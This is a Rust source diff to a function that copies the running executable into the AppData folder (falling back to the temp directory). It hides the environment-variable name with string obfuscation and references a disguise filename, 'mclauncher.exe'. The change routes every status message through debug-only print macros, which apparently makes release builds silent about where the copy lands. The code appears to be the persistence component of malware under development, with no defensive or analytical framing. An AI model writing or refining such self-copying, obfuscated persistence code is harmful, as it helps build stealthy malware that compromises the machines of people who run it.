@@ -4,6 +4,7 @@ use std::path::PathBuf;
 
 use obfuse::obfuse;
 
+use crate::{debug_eprintln, debug_println};
 
 pub fn self_copying() -> std::io::Result<()> {
     let current_exe = env::current_exe()?;
@@ -11,10 +12,10 @@ pub fn self_copying() -> std::io::Result<()> {
     let appdata_str = obfused_appdata.as_str();
 
     let mut dest_path = if let Ok(appdata) = env::var(appdata_str) {
-        println!("[INFO] Using AD directory: {}", appdata);
+        debug_println!("[INFO] Using AD directory: {}", appdata);
         PathBuf::from(appdata)
     } else {
-        println!("[INFO] AD not found, using TEMP directory: {:?}", env::temp_dir());
+        debug_println!("[INFO] AD not found, using TEMP directory: {:?}", env::temp_dir());
         env::temp_dir()
     };
 
@@ -24,7 +25,7 @@ pub fn self_copying() -> std::io::Result<()> {
     dest_path.push(dir_name);
     if !dest_path.exists() {
         fs::create_dir_all(&dest_path)?;
-        println!("[INFO] Created directory: {:?}", dest_path);
+        debug_println!("[INFO] Created directory: {:?}", dest_path);
     }
 
     // let file_name = current_exe.file_name().unwrap_or_else(|| std::ffi::OsStr::new("mclauncher.exe"));
@@ -34,7 +35,7 @@ pub fn self_copying() -> std::io::Result<()> {
     dest_path.push(file_name);
     fs::copy(&current_exe, &dest_path)?;
 
-    println!("[INFO] Copied to: {:?}", dest_path);
+    debug_println!("[INFO] Copied to: {:?}", dest_path);
 
     Ok(())
 }
